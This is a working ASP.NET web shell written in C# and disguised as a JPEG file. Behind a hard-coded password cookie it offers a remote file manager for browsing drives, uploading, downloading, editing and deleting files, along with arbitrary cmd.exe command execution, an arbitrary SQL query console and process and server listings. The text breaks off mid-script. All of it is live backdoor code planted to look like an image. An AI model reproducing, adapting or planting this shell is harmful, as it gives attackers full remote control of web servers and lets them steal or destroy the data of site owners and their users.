���� JFIF      ���j<%@ Page Language="C#"   trace="false" EnableViewStateMac="false"  validateRequest="false"  enableEventValidation="false" %>
<%@ import Namespace="System.Collections.Generic"%> 
<%@ import Namespace="System.Web.Services"%> 
<%@ import Namespace="System.Web"%> 
<%@ import Namespace="System.IO"%> 
<%@ import Namespace="System"%> 
<%@ import Namespace="System.Net" %>
<%@ import Namespace="System.Diagnostics"%> 
<%@ Import Namespace="System.Data.SqlClient"%>
<%@ import Namespace="Microsoft.Win32"%>
<%@ import Namespace="System.Management"%>
<%@ Assembly Name="System.Management,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A"%>
<!DOCTYPE html>
<style type="text/css">
body {
	background: #f0f0f0;
	margin: 0;
	padding: 0; 
	font: 12px normal Verdana, Arial, Helvetica, sans-serif;
	color: #444;
    width:1000px;
}
h1 {font-size: 3em; margin: 20px 0;}
.container {width: 90%; margin: 10px auto;}
ul.tabs {
	margin: 0;
	padding: 0;
	float: left;
	list-style: none;
	height: 32px;
	border-bottom: 1px solid #999;
	border-left: 1px solid #999;
	width: 100%;
}
ul.tabs li {
	float: left;
	margin: 0;
	padding: 0;
	height: 31px;
	line-height: 31px;
	border: 1px solid #999;
	border-left: none;
	margin-bottom: -1px;
	background: #e0e0e0;
	overflow: hidden;
	position: relative;
}
ul.tabs li a {
	text-decoration: none;
	color: #000;
	display: block;
	font-size: 1.2em;
	padding: 0 20px;
	border: 1px solid #fff;
	outline: none;
}
ul.tabs li a:hover {
	background: #ccc;
}	
html ul.tabs li.active, html ul.tabs li.active a:hover  {
	background: #fff;
	border-bottom: 1px solid #fff;
}
.tab_container {
	border: 1px solid #999;
	border-top: none;
	clear: both;
	float: left; 
	width: 100%;
	background: #fff;
	-moz-border-radius-bottomright: 5px;
	-khtml-border-radius-bottomright: 5px;
	-webkit-border-bottom-right-radius: 5px;
	-moz-border-radius-bottomleft: 5px;
	-khtml-border-radius-bottomleft: 5px;
	-webkit-border-bottom-left-radius: 5px;
}
.tab_content {
	padding: 20px;
	font-size: 1.2em;
}
.tab_content h2 {
	font-weight: normal;
	padding-bottom: 10px;
	border-bottom: 1px dashed #ddd;
	font-size: 1.8em;
}
.tab_content h3 a{
	color: #254588;
}
.tab_content img {
	float: left;
	margin: 0 20px 20px 0;
	border: 1px solid #ddd;
	padding: 5px;
}
</style>
<style type="text/css">
    iframe.hidden
{
display:none
}
        td
        {
            padding: 2px;
            background: #e8edff;
            border-top: 1px solid #fff;
            color: #669;
            
        }
         tr:hover td{ 
                background-color:#7DFDFE;
                
                
               
                }
     th
    {
        padding: 2px;
        color: #039;
        background: #b9c9fe;
    }
                
                    
    table
    {
        height: 100%;
        width: 100%;
    }
    #content
    {
        z-index: 1;
        left: 20px;
        top: 39px;
        position: absolute;
        height: 155px;
        width: 1214px;
    }
    #upload
    {
        width: 527px;
        height: 52px;
        background-color: #CCCCCC;
    }
    #TextArea1
    {
        height: 278px;
        width: 380px;
    }
    .buttons
    {
        height:30px;
        cursor:pointer;
    }
    </style>

 

<script runat="server">
/// <problems>
/// - javascript registered code
/// - driver dropdownlist problem 
/// </problem>
/// 

    /// <TO DO>
    /// - create new file ,dir.
    /// - copy /cut file ,dir
    /// </TO DO>
    /// 

     public static string curr = "xxx";
     string connstr;
     string password="handler";
     public class data
     {
         public data(string n, string s, string fp, string lm)
         {
             Name = n; Size = s; FullPath = fp;lastmodfiy=lm;
         }
         public string Name;
         public string FullPath;
         public string Size;
         public string lastmodfiy;
     }
     public static void RegisterJavaScript(System.Web.UI.Page page)
     {
         
               page.ClientScript.RegisterHiddenField("__EVENTTARGET","");
                page.ClientScript.RegisterHiddenField("__ARGS","");
                string s=@"<script language=Javascript>";
                s+=@"function Bin_PostBack(eventTarget,eventArgument)";
                s+=@"{";
                s+=@"var theform=document.forms[0];";
                s+=@"theform.__EVENTTARGET.value=eventTarget;";
                s+=@"theform.__ARGS.value=eventArgument;";
                s+=@"theform.submit();";
                s+=@"} ";
                s+=@"</scr"+"ipt>";
                page.RegisterStartupScript("asd",s);
         
                }
     
     
                
    protected void Page_Load(object sender, EventArgs e)
    {
        Page.Title = " ";
        RegisterJavaScript(this);
        hide_allpanel();
        if (DriversList.Items.Count == 0)
        {
            DriveInfo[] drives = DriveInfo.GetDrives();
            DriversList.Items.Clear();
            DriversList.Items.Add("Select Drive");
            foreach (DriveInfo dinfo in drives)
            {

                DriversList.Items.Add(new ListItem(dinfo.Name + "  " + dinfo.DriveType, dinfo.Name));  //);
            }
        }
        //////////////////////////
       
        ////////////////////////////////
        if (check_auth())
        {
          
            this.Menue.Visible = true;
            Logout.Visible = true;
          
            
        }
        else
        {
           return;
           
        }
        msgs.Text = "";        
        
       if (Request.QueryString["Name"] != null || Request.QueryString["Name"] != "")
       {
           string temp = Request.QueryString["Name"];
           if(temp != null)
           download(base64Decode(temp));
      
       }
       
         
        if (!IsPostBack)
        {
            
            
         
             GetFiles_Dirs(".", true);
        //   string[] drivers = Directory.GetLogicalDrives();
            
           
    
        /////////////////
           
            
       }
        if (IsPostBack)
        {
           
            string evarg = Request["__EVENTTARGET"];
            string args = Request["__ARGS"];
            
          //  Page.Title = evarg;
            if (evarg != "")
            {
                switch (evarg)
                {
                    
                    case "down":
                        download(base64Decode(args));
                        break;
                    case "GetFiles_Dirs":
                        GetFiles_Dirs(base64Decode(args), false);
                        break;
                    case "shell_root":
                        GetFiles_Dirs(base64Decode(args), true);
                        break;
                    case "del":
                        delete_file(base64Decode(args));
                       break;
                    case "del2":
                       delete_folder(base64Decode(args));
                       break;
                    case "delall":
                       deleteall(args);
                       break;
                    case "ren":
                       rename_file(args);
                        break;
                    case "ren2":
                        rename_folder(args);
                        break;
                    case "edit":
                        editing(base64Decode(args));
                        break;

                    case "newdir":
                        create_new_dir((args));
                        break;
                    case "newfile":
                        create_new_file((args));
                        break;
                   
                }

               
            }
        }
        
        //if(IsPostBack)
      
            
    }
    public bool check_auth()
    {
        if (Request.Cookies["Login_Cookie"] == null)
        {
            return false;
        }
        else
        {
            if (Request.Cookies["Login_Cookie"].Value != password)
            {
                return false;
            }
            else
            {
                
                return true;
            }
        }
    }
    public void hide_allpanel()
    {
        this.Login.Visible = true;
        object[] divs = { this.FileManger, this.CMD, this.DBS ,this.editpanel,this.UserInfo,this.Processes_Services,this.CopyFiles};
        foreach (object s in divs)
        {
            Panel p2 = new Panel();
            p2 = (Panel)s;
            p2.Visible = false;
        }
    }

    void process()
    {
        Table tbl = new Table();

        //   tbl.Style = @"width:100%";
        tbl.Width = 870;
        this.Processes_Services.Controls.Add(tbl);
        int tblRows = 10;
        int tblCols = 3;
        TableHeaderRow header_tr = new TableHeaderRow();
        TableHeaderCell proc_id = new TableHeaderCell();
        TableHeaderCell proc_user = new TableHeaderCell();
        TableHeaderCell proc_name = new TableHeaderCell();
        proc_id.Text = "ID";
       proc_name.Text = "Process Name";
       proc_user.Text = "User";
        header_tr.Cells.Add(proc_id);
        header_tr.Cells.Add(proc_name);
         header_tr.Cells.Add(proc_user);
        tbl.Rows.Add(header_tr);
        Process[] p = Process.GetProcesses();
        foreach (Process sp in p)
        {
            TableRow data_tr = new TableRow();
            TableCell proc_id_tc = new TableCell();
             proc_id_tc.Text = sp.Id.ToString();
            TableCell proc_name_tc = new TableCell();
            proc_name_tc.Text =  sp.ProcessName;
            TableCell proc_user_tc = new TableCell();
         //   proc_user_tc.Text =  GetProcessOwner(sp.Id.ToString());// GetUserName(sp.Id);//
            data_tr.Cells.Add(proc_id_tc);
            data_tr.Cells.Add(proc_name_tc);
            data_tr.Cells.Add(proc_user_tc);
            tbl.Rows.Add(data_tr);

        }
        message(true, "list process");
    }

    string get_user_process(int i)
    {
        using (ManagementObject proc = new   
            
            ManagementObject("Win32_Process.Handle='" + i.ToString() + "'"))
        {

         //   proc.Get();
            string[] s = new String[2];
            //Invoke the method and populate the array with the user name and domain

            proc.InvokeMethod("GetOwner", (object[])s);

            return s[1] + "\\" + s[0];
        }


    }
    private string GetUserName(int procName)
    {
        string[] ownerInfo = new string[2];
        foreach (ManagementObject p in PhQTd("Select * from Win32_Process Where ProcessID ='" + procName + "'"))
        {
            p.InvokeMethod("GetOwner", (object[])ownerInfo);
        }
        return ownerInfo[0];
        
        
    }

    public string GetProcessOwner(string processName)
    {
        string query = "Select * from Win32_Process Where ProcessID = \"" + processName + "\"";
        ManagementObjectSearcher searcher = new ManagementObjectSearcher(query);
        ManagementObjectCollection processList = searcher.Get();

        foreach (ManagementObject obj in processList)
        {
            string[] argList = new string[] { string.Empty, string.Empty };
            int returnVal = Convert.ToInt32(obj.InvokeMethod("GetOwner", argList));
            if (returnVal == 0)
            {
                // return DOMAIN\user
                string owner = argList[1] + "\\" + argList[0];
                return owner;
            }
        }

        return "NO OWNER";
    }
    
    
        public ManagementObjectCollection PhQTd(string query)
{
ManagementObjectSearcher QS=new ManagementObjectSearcher(new SelectQuery(query));
return QS.Get();
}
    void u_info()
    {
        Table tbl = new Table();
        
     //   tbl.Style = @"width:100%";
        tbl.Width = 870;
        this.UserInfo.Controls.Add(tbl);
        Add_Table_Row(tbl, "Server IP", Request.ServerVariables["LOCAL_ADDR"]);
        Add_Table_Row(tbl, "Host Name", Dns.GetHostName() );//Environment.MachineName);
        Add_Table_Row(tbl, "IIS Version", Request.ServerVariables["SERVER_SOFTWARE"]);
        Add_Table_Row(tbl, "IIS APPPOOL Identity", Environment.UserName);
        Add_Table_Row(tbl, "OS Version", Environment.OSVersion.ToString());
        Add_Table_Row(tbl, "System Time", DateTime.Now.ToString());
      
        
        
        message(true, "");
    }

    void Add_Table_Row(Table tbl, string s1, string s2)
    {
        TableRow data_tr = new TableRow();
        TableCell cell1 = new TableCell();
        cell1.Text = s1;
        TableCell cell2 = new TableCell();
        cell2.Text = s2;
        data_tr.Cells.Add(cell1);
        data_tr.Cells.Add(cell2);
        tbl.Rows.Add(data_tr);
    }
    // ////////////////////////////////////////////
    public void process_design(object sender, EventArgs e)
    {
        Button b = sender as Button;
      //  b.BackColor = System.Drawing.Color.Red;
        //LinkButton b = sender as LinkButton;
        show_panel(b.Text);
        if (b.Text == "Processes_Services")
            process();
        if (b.Text == "UserInfo")
            u_info();
        
    }
    // /////////////////////////////////////
    public void fm(object sender, EventArgs e)
    {
        this.FileManger.Visible = true;
        GetFiles_Dirs(".", true);
    }

    public void show_panel(string ctrl)
    {
        this.Login.Visible = false;
        object[] divs = { this.FileManger, this.CMD, this.DBS,this.editpanel ,this.UserInfo, this.Processes_Services,this.CopyFiles};
        foreach (object s in divs)
        {
            Panel p2 = new Panel();
            p2 = (Panel)s;
            if (p2.ID==ctrl)
                p2.Visible = true; 
          //  if(p2.ID=="FileManger")
             //   GetFiles_Dirs(".", true);
        }
    }
    
  
   


    public string base64Encode(string data)
    {
        try
        {
            byte[] encData_byte = new byte[data.Length];
            encData_byte = System.Text.Encoding.UTF8.GetBytes(data);
            string encodedData = Convert.ToBase64String(encData_byte);
            return encodedData;
        }
        catch (Exception e)
        {
            throw new Exception("Error in base64Encode" + e.Message);
        }
    }

    public string base64Decode(string data)
    {
        try
        {
            System.Text.UTF8Encoding encoder = new System.Text.UTF8Encoding();
            System.Text.Decoder utf8Decode = encoder.GetDecoder();

            byte[] todecode_byte = Convert.FromBase64String(data);
            int charCount = utf8Decode.GetCharCount(todecode_byte, 0, todecode_byte.Length);
            char[] decoded_char = new char[charCount];
            utf8Decode.GetChars(todecode_byte, 0, todecode_byte.Length, decoded_char, 0);
            string result = new String(decoded_char);
            return result;
        }
        catch (Exception e)
        {
            throw new Exception("Error in base64Decode" + e.Message);
        }
    }
    
    public void message(bool status, string msg)
    {
        if (status == true)
        {
            msgs.ForeColor = System.Drawing.Color.Green;
            msgs.Text = "Sucess, " + msg;
        }
        else
        {
            msgs.ForeColor = System.Drawing.Color.Red;
            msgs.Text = "Error, " + msg;
        }
    }

    string count_files_dirs(string p)
    {
        int fc = 0; int dc = 0;
        string[] files = Directory.GetFiles(p);
        string[] dirs = Directory.GetDirectories(p);
        foreach (string f in files)
        {
            fc += 1;
        }
        foreach (string f in dirs)
        {
            dc += 1;
        }
        return dc+" dirs, "+fc+" files";
    }
    public  void GetFiles_Dirs(string path ,bool isvirtual)
    {
        try
        {

            show_panel(this.FileManger.ID);
            editpanel.Visible = false;
            curr = path;

            ArrayList arraydata = new ArrayList();

            string currentpath = "";
            if (isvirtual)
            {
                currentpath = HttpContext.Current.Server.MapPath(path);
            }
            else
                currentpath = path;
            currentpathlabel.Text = currentpath;
            Hidden1.Value = currentpath;


            string[] files = Directory.GetFiles(currentpath);
            string[] dirs = Directory.GetDirectories(currentpath);
            string previospath = "";
            string[] ppath = currentpath.Split('\\');
            for (int n = 1; n <= ppath.Length - 1; n++)
            {

                if (ppath.Length - 1 == 1)
                {
                    previospath += ppath[n - 1] + "\\";


                }
                else if (n == ppath.Length - 1)
                {
                    previospath += ppath[n - 1];


                }
                else
                {
                    previospath += ppath[n - 1] + "\\";

                }


            }
            string prevtemp = "";
            //  Literal1.Text = previospath;
            for (int n = 0; n < ppath.Length; n++)
            {

                if (n == 0)
                {

                    //<%=  base64Encode(ppath[n] + "\\")%>
                    string dec = base64Encode(ppath[n] + "\\");
                    Literal1.Text = "<a href=\"javascript:Bin_PostBack('GetFiles_Dirs','" + dec + "')\">" + ppath[n] + "\\" + "</a>";
                    prevtemp = ppath[n];

                }
                else
                {
                    string dec1 = base64Encode(prevtemp + "\\" + ppath[n]);

                    Literal1.Text += "<a href=\"javascript:Bin_PostBack('GetFiles_Dirs','" + dec1 + "')\">" + ppath[n] + "\\" + "</a>";
                    prevtemp = prevtemp + "\\" + ppath[n];

                }



            }
           arraydata.Add(new data("..  " , "Parent Folder", previospath, currentpath));
          
             
            //  object o = new object { Name = "..", Size = "..", FullPath = previospath.Replace(@"\", @"\\"), DataSource = currentpath };
            //fileslist.Add(new { Name = "..", Size = "..", FullPath = previospath.Replace(@"\", @"\\"), DataSource = currentpath });
             int dirs_count = 0;
            int files_count = 0;

            foreach (string d in dirs)
            {
                DirectoryInfo dinfo = new DirectoryInfo(d);
                HyperLink g = new HyperLink();
                g.Text = dinfo.Name;
                //  fileslist.Add(new { Name = dinfo.Name, Size = "Folder", FullPath = dinfo.FullName.Replace(@"\", @"\\"), DataSource = currentpath });
                arraydata.Add(new data(dinfo.Name, "Folder", dinfo.FullName, dinfo.LastWriteTime.ToString("d/MM/yyyy - hh:mm:ss tt")));
                dirs_count+=1;

            }
            foreach (string f in files)
            {
                FileInfo finfo = new FileInfo(f);


                arraydata.Add(new data(finfo.Name, finfo.Length.ToString(), finfo.FullName.Replace(@"\", @"\\"), finfo.LastWriteTime.ToString("d/MM/yyyy  - hh:mm:ss tt")));
                files_count += 1;
            }
            
           
            
            foreach (object o in arraydata)
            {
                data d = (data)o;

                HtmlTableRow r = new HtmlTableRow();
                HtmlTableCell cname = new HtmlTableCell();
                HtmlTableCell csize = new HtmlTableCell();
                HtmlTableCell lastmodify = new HtmlTableCell();
                HtmlTableCell ctodo = new HtmlTableCell();
                if (d.Size == "Parent Folder")

                    cname.InnerHtml = "<a href=\"javascript:Bin_PostBack('GetFiles_Dirs','" + base64Encode(d.FullPath) + "')\">" + d.Name + "</a>" + "&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp " + files_count + "&nbspFiles ," + dirs_count + "&nbspFolders";

                else if (d.Size == "Folder")
                {
                    cname.InnerHtml = "<a href=\"javascript:Bin_PostBack('GetFiles_Dirs','" + base64Encode(d.FullPath) + "')\">" + d.Name + "</a>";
                    csize.InnerHtml = "--";
                    lastmodify.InnerHtml = d.lastmodfiy;
                    ctodo.InnerHtml ="<a href=\"#\" onclick=\"javascript:rename2('" + d.Name + "')\">Rename</a>" + " || " +
                   "<a href=\"#\" onclick=\"javascript:if(confirm('Are you sure delete folder " + d.Name+ " it may be non-empty ,all files & dirs will be deleted ?')){Bin_PostBack('del2','" + base64Encode(d.FullPath) + "')}\">Del</a>";
                }
                else
                {
                    //"<a href=\"javascript:Bin_PostBack('Bin_Listdir','"+MVVJ(objfile.DirectoryName)+"')\">"+objfile.FullName+"</a>";
                    cname.InnerHtml = "<input id=\"Checkbox1\" name=\"" + base64Encode(d.FullPath) + "\" type=\"checkbox\" />" + d.Name;
                    csize.InnerHtml = convert_bytes(Convert.ToInt64(d.Size));
                    lastmodify.InnerHtml = d.lastmodfiy;
                    ctodo.InnerHtml = "<a href= \"#\" onclick=\"javascript:Bin_PostBack('down','" + base64Encode(d.FullPath) + "')\">Down</a>" + " || " +
                        "<a href=\"#\" onclick=\"javascript:Bin_PostBack('edit','" + base64Encode(d.FullPath) + "')\">Edit</a>" + " || " +
                        "<a href=\"#\" onclick=\"javascript:rename('" + d.Name + "')\">Rename</a>" + "|" +
                        "<a href=\"#\" onclick=\"javascript:Bin_PostBack('copymove','" + base64Encode(d.FullPath) + "')\">Copy/Move</a>" + " || " +
                    "<a href=\"#\" onclick=\"javascript:if(confirm('Are you sure delete the file  "+ d.Name+"  ?')){Bin_PostBack('del','" + base64Encode(d.FullPath) + "')}\">Del</a>";
                }
                r.Cells.Add(cname);
                r.Cells.Add(csize);
                r.Cells.Add(lastmodify);
                r.Cells.Add(ctodo);
                tblEmployee.Rows.Add(r);


            }
        }
        catch (Exception ex)
        {
            message(false, ex.Message);
        }
    }

    string convert_bytes(Int64 bytes)
    {
        
        if ((bytes / 1024) < 1)
            return bytes + " B";
         
        else if ((bytes / (1024 * 1024)) < 1)
           return string.Format("{0:####0.0} KB",(double) bytes / 1024 );
            
        else if ((bytes / (1024 * 1024 * 1024)) < 1)
           return string.Format("{0:####0.0} MB", (double)bytes / (1024 * 1024));
                       
        else
            return string.Format("{0:####0.0} GB", (double) bytes / (1024 * 1024 * 1024));

    
    
    }
    // //////////////////////////////

    void create_new_dir(string dir)
    {
        try
        {
            string path = currentpathlabel.Text + "\\";
            Directory.CreateDirectory(path + dir);
            message(true, "Folder:" + " '" + dir + "' " + "Created");
        }
        catch (Exception ex)
        {
            message(false, ex.Message);
        } 
        
        GetFiles_Dirs(currentpathlabel.Text, false);
    }

    void create_new_file(string file)
    {
        try
        {
            string path = currentpathlabel.Text + "\\";
            if (File.Exists(path + file))
            {
                message(false, "File" + " '" + file + "' " + "exist,you can edit it");
                GetFiles_Dirs(currentpathlabel.Text, false);
            }
            else
            {

                StreamWriter sr = new StreamWriter(path + file, false);
                sr.Close();
                message(true, "New File" + " '" + file + "' " + "Created");
                editing(path + file);
            }
        }
        catch (Exception ex)
        {
            message(false, ex.Message);
        }

       // GetFiles_Dirs(currentpathlabel.Text, false);
    }
    // //////// Edit File//////////////////
    public void editing(string file)
    {
        try
        {
            show_panel("editpanel");


            filetoedit.Text = file;
            if (File.Exists(file))
            {
                StreamReader sr;

                sr = new StreamReader(file);

                editfile.Text = sr.ReadToEnd();
                sr.Close();
            }
        }
        catch (Exception ex)
        {
            message(false, ex.Message);
        }

    }
    protected void Save_Click(object sender, EventArgs e)
    {
        try
        {

            StreamWriter sw;
            string file = filetoedit.Text;
            sw = new StreamWriter(file, false);

            sw.Write(editfile.Text);
            sw.Close();
            message(true, "File:" + " '" + file + "' " + "Saved");


        }
        catch (Exception ex)
        {
            message(false, ex.Message);
        }
        GetFiles_Dirs(currentpathlabel.Text, false);
    }
    // /////////////////////////////////
    
    // ///////////upload///////////////////
    protected void Upload_Click(object sender, EventArgs e)
    {
        try
            {

        if (FileUpload1.HasFile)
             {
            
                string filename = Path.GetFileName(FileUpload1.FileName);
                FileUpload1.SaveAs(currentpathlabel.Text + "\\" + filename);
                message(true, "File: '" + currentpathlabel.Text + "\\" + filename + "'Uploaded");
              
             }
        }
            catch (Exception ex)
            {
                message(false, ex.Message);
            }
          GetFiles_Dirs(currentpathlabel.Text, false);
    }
    // ////////////////////////////////////////////
    
    // /////////////download file(s)/////////////////
    public void download(string path)
    {
        try
        {
            FileInfo fs = new FileInfo(path);
            Response.Clear();
            Page.Response.ClearHeaders();
            Page.Response.Buffer = false;
            this.EnableViewState = false;
           // Response.AddHeader("Content-Disposition", "attachment;filename=" + HttpUtility.UrlEncode(fs.Name, System.Text.Encoding.UTF8));
            Response.AddHeader("Content-Disposition", "attachment;filename=" + fs.Name);
            Response.AddHeader("Content-Length", fs.Length.ToString());
            Page.Response.ContentType = "application/unknown";
            Response.WriteFile(fs.FullName);
            Page.Response.Flush();
            Page.Response.Close();
            Response.End();
            Page.Response.Clear();           
        }
        catch (Exception ex)
        {
            message(false, ex.Message);
        }
            
    }

    // ////////////////////////////////////////////

    // /////////////rename file(s)/////////////////
    public void rename_file(string paths)
    {
        try
        {
            string[] files = paths.Split(',');

            File.Move(currentpathlabel.Text + "\\" + files[0], currentpathlabel.Text + "\\" + files[1]);
            message(true, "File Renamed");
         
        }
        catch (Exception ex)
        {
            message(false, ex.Message);
        }  
        GetFiles_Dirs(currentpathlabel.Text, false);
    }
     /////////////////////////////////////////////

    public void rename_folder(string paths)
    {
        try
        {
            string[] files = paths.Split(',');
            
           Directory.Move(currentpathlabel.Text + "\\" + files[0], currentpathlabel.Text + "\\" + files[1]);
            message(true, "Folder Renamed");

        }
        catch (Exception ex)
        {
            message(false, ex.Message);
        }
        GetFiles_Dirs(currentpathlabel.Text, false);
    }
    // ////////////////////////////
     
    // /////////////delete files/////////////////
    public void deleteall(string paths)
    {
        try
        {
            string[] files = paths.Split(',');
            for (int i = 0; i < files.Length - 1; i++)
            {

                File.Delete(base64Decode(files[i]));
            }
            message(true, "Files Delted");
        }
        catch (Exception ex)
        {
            message(false, ex.Message);
        }
      


        
        GetFiles_Dirs(currentpathlabel.Text, false);
    }

    // ////////////////////////////////////////////

    // /////////////delete file/////////////////
    public void delete_file(string path)
    {
        try
        {
            FileInfo fs = new FileInfo(path);


            fs.Delete();
            message(true, "File Deleted");
        }
        catch (Exception ex)
        {
            message(false, ex.Message);
        }
        GetFiles_Dirs(currentpathlabel.Text, false);
    }
        //////////////////////////////////////
        
        public void delete_folder(string path)
    {
        try
        {
            DirectoryInfo  fs = new DirectoryInfo(path);


            fs.Delete(true);
            message(true, "Folder Deleted");
        }
        catch (Exception ex)
        {
            message(false, ex.Message);
        }
        
        GetFiles_Dirs(currentpathlabel.Text, false);
    }



    // ////////////////////////////////////////////

    // /////////////dos commands/////////////////
    protected void CmdSubmit_Click(object sender, EventArgs e)
    {
        show_panel(this.CMD.ID);
        CmdResult.Text = command(Command.Text);
    }
   
    public static string command(string cmd)
    {
      //  string argument = string.Format(@" -S {0} -U {1} -P {2} ", "LOSMAN-PC", "test", "asd");
        string argument = string.Format(@" -S {0} ", "LOSMAN-PC");
      //  System.Diagnostics.ProcessStartInfo psi = new System.Diagnostics.ProcessStartInfo("sqlcmd.exe",argument);
      System.Diagnostics.ProcessStartInfo psi = new System.Diagnostics.ProcessStartInfo("cmd.exe");
        psi.CreateNoWindow = true;
        psi.UseShellExecute = false;
        psi.RedirectStandardOutput = true;
        psi.RedirectStandardInput = true;
        psi.RedirectStandardError = true;
        psi.WorkingDirectory = HttpContext.Current.Server.MapPath(".");
        // Start the process
        System.Diagnostics.Process proc = System.Diagnostics.Process.Start(psi);

        // Attach the output for reading
        System.IO.StreamReader sOut = proc.StandardOutput;
        System.IO.StreamReader sOut2 = proc.StandardError;
        //  sOut = proc.StandardError;
        // Attach the in for writing
        System.IO.StreamWriter sIn = proc.StandardInput;
        string commands = cmd;
        string[] delimiter = { Environment.NewLine };

        string[] b = commands.Split(delimiter, StringSplitOptions.None);
        foreach (string s in b)
        {
            sIn.WriteLine(s);
        }
        // string stEchoFmt = "# {0} run successfully. Exiting";


        //  sIn.WriteLine(String.Format(stEchoFmt, ""));
        // Write each line of the batch file to standard input
        sIn.WriteLine("Exit");
        // Close the process
        proc.Close();
        // Read the sOut to a string.
        string results = sOut.ReadToEnd().Trim();
      string resultserror =sOut2.ReadToEnd().Trim();
        // Close the io Streams;
        sIn.Close();
        sOut.Close();

        return results + resultserror;

    }

    // ////////////////////////////////////////////

    // /////////////get drive files & dirs/////////////////
    protected void slctdrive_Click(object sender, EventArgs e)
    {
        try
        {

           if (DriversList.SelectedValue == "Select Drive")
               GetFiles_Dirs(currentpathlabel.Text, false);
           
               GetFiles_Dirs(DriversList.SelectedValue, false);
        //}
        }
        catch (Exception ex)
        {
            message(false, ex.Message);
        }

    }
    private void getdatabases(int ind)
    {

        try
        {
            DropDownList1.Items.Clear();

            SqlConnection myconn;
            SqlCommand mycomm;

            myconn = new SqlConnection(connections.Text);
            myconn.Open();
            string command = "SELECT name FROM sys.sysdatabases where name NOT IN ('master', 'tempdb', 'model', 'msdb') order by name; ";

            mycomm = new SqlCommand(command, myconn);
            SqlDataReader dr = mycomm.ExecuteReader();
            while (dr.Read())
            {
                DropDownList1.Items.Add(dr[0].ToString());
            }
            myconn.Close();

            DropDownList1.SelectedIndex = ind;

        }
        catch (Exception ex)
        {
            msgs.Text = ex.Message;
        }
    }
    // ///////////////////////////
    private void gettables(int ind)
    {
        try
        {
            DropDownList2.Items.Clear();

            SqlConnection myconn;
            SqlCommand mycomm;

            myconn = new SqlConnection(connections.Text);
            myconn.Open();
            string command = "SELECT * FROM sys.tables order by name; ";

            mycomm = new SqlCommand(command, myconn);
            SqlDataReader dr = mycomm.ExecuteReader();
            while (dr.Read())
            {

                DropDownList2.Items.Add(dr[0].ToString());
            }

            DropDownList2.SelectedIndex = ind;
            myconn.Close();
        }
        catch (Exception ex)
        {
            msgs.Text = ex.Message;
        }
    }


    // //////////////////////////////////////////////////////////////////
    public ArrayList getcolums()
    {
          SqlConnection myconn;
            SqlCommand mycomm;
            ArrayList arrcolumns = new ArrayList();
            myconn = new SqlConnection(connections.Text);
            myconn.Open();
            string command = "SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'Bugs'; ";

            mycomm = new SqlCommand(command, myconn);
            SqlDataReader dr = mycomm.ExecuteReader();
            Table tbl = new Table();
           this.DBS.Controls.Add(tbl);
           while (dr.Read())
           {
               arrcolumns.Add(dr[0].ToString());
           }
           return arrcolumns;
    }
     private void CreateDynamicTable(string query)
    {
        try
        {
            // ArrayList arrcolumns = getcolums();
            SqlConnection myconn;
            SqlCommand mycomm;

            myconn = new SqlConnection(connections.Text);
            myconn.Open();
            string command = query;

            mycomm = new SqlCommand(command, myconn);
            SqlDataReader dr = mycomm.ExecuteReader();
            Table tbl = new Table();
            tbl.Width = 100;
            this.DBS.Controls.Add(tbl);
            int tblRows = 10;
            int tblCols = dr.FieldCount; ;
            TableRow tr2 = new TableRow();

            for (int j = 0; j < dr.FieldCount; j++)
            {
                TableHeaderCell tc = new TableHeaderCell();
                TextBox txtBox = new TextBox();


                // Add the control to the TableCell
                tc.Text = dr.GetName(j).ToString();
                // Add the TableCell to the TableRow
                tr2.Cells.Add(tc);
            }
            tbl.Rows.Add(tr2);
            int c = 0;
            while (dr.Read())
            {
                

                TableRow tr = new TableRow();
                for (int j = 0; j < tblCols; j++)
                {
                    TableCell tc = new TableCell();
                    TextBox txtBox = new TextBox();

                    // Add the control to the TableCell
                    tc.Text = dr[j].ToString();
                    // Add the TableCell to the TableRow
                    tr.Cells.Add(tc);
                }
                // Add the TableRow to the Table
                tbl.Rows.Add(tr);
                c=c+1;
               
            }
            message(true, c.ToString() + " rows selected");
        }
        catch (Exception ex)
        {
            message(false, ex.Message);
        }
 
       // This parameter helps determine in the LoadViewState event,
       // whether to recreate the dynamic controls or not
 
      
    }
    // ////////////////////////////
    protected void gdb_Click(object sender, EventArgs e)
    {
        show_panel(this.DBS.ID);
        connstr = connections.Text;
        getdatabases(0);
    }

 
    protected void Button1_Click(object sender, EventArgs e)
    {
        show_panel(this.DBS.ID);
        gettables(0);
       // CreateDynamicTable();
    }
    // //////////////////////////////////////////////////////////////////

    protected void executequery_Click(object sender, EventArgs e)
    {
        show_panel(this.DBS.ID);
        CreateDynamicTable(sqlquery.Text);
    }

    protected void Login_Button_Click(object sender, EventArgs e)
    {
        string pass = Login_TextBox.Text;
        if (pass == password)
        {
            Response.Cookies.Add(new HttpCookie("Login_Cookie", pass));
          //  show_panel(this.FileManger.ID);
             GetFiles_Dirs(".", true);
             this.Menue.Visible = true;
             Logout.Visible = true;
         }
        else
        {
         
        }
    }

    protected void Logout_Click(object sender, EventArgs e)
    {
        hide_allpanel();
        this.Menue.Visible = false;
        //this.Login.Visible = true;
        Session.Abandon();
        Response.Cookies.Add(new HttpCookie("Login_Cookie", null));
        Logout.Visible = false;
    }

    protected void Button_process_Click(object sender, EventArgs e)
    {
        show_panel(this.Processes_Services.ID);
        process();
    }

    protected void Button_services_Click(object sender, EventArgs e)
    {
        show_panel(this.Processes_Services.ID);
        process();
    }

    protected void DriversList_SelectedIndexChanged(object sender, EventArgs e)
    {
     //  DriversList.SelectedIndex =DriversList.Items[DriversList.SelectedIndex].;
        Page.Title = DriversList.SelectedValue;
    }
    public void CopyShell(String Source, String Dest)
    {
        System.IO.File.Copy(Source, Dest, true);
    }
    public void CopyFile(object sender, EventArgs e)
    {
        show_panel(this.CopyFiles.ID);
        try
        {
            CopyShell(this.TextBox1.Text, this.TextBox2.Text);
            Label3.Text = "Success............";
        }
        catch (Exception ex)
        {
            Label3.Text = ex.Message;
        }
    }
</script>

<script type="text/javascript">

    function rename(file) {
        var f = prompt("rename file:", file);
        var renfile = file;
        if (f != null) {
            renfile += "," + f
            Bin_PostBack('ren', renfile);

        }

    }


    function rename2(folder) {
        var f = prompt("rename file:", folder);
        var renfile = folder;
        if (f != null) {
            renfile += "," + f
            Bin_PostBack('ren2', renfile);

        }

    }

    function newfolder() {
        var folder = prompt("Create New Folder", "");
       
        if (folder != null) {
           
